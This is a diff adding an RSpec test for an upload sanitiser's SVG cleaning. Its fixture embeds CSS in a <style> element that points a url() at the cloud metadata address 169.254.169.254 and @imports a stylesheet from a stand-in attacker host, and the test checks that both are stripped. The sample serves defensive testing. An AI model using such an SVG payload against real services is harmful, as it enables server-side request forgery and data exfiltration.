@@ -684,6 +684,36 @@ RSpec.describe UploadCreator do
     ensure
       file.unlink
     end
+
+    context "with CSS in <style> elements" do
+      let(:style_file) do
+        file = Tempfile.new
+        file.write(<<~XML)
+          <?xml version="1.0" encoding="UTF-8"?>
+          <svg xmlns="http://www.w3.org/2000/svg">
+            <style>
+              text { background-image: url("http://169.254.169.254/latest/meta-data/"); }
+              @import url("https://attacker.example.com/exfil-via-css.css");
+            </style>
+            <text>hello</text>
+          </svg>
+        XML
+        file.rewind
+        file
+      end
+
+      it "strips external url() references and @import rules from <style> content" do
+        UploadCreator.new(style_file, "file.svg").clean_svg!
+        file_content = style_file.read
+
+        expect(file_content).not_to include("169.254.169.254")
+        expect(file_content).not_to include("attacker.example.com")
+        expect(file_content).not_to include("@import")
+        expect(file_content).to include("<text>hello</text>")
+      ensure
+        style_file.unlink
+      end
+    end
   end
 
   describe "svg sizes expressed in units other than pixels" do
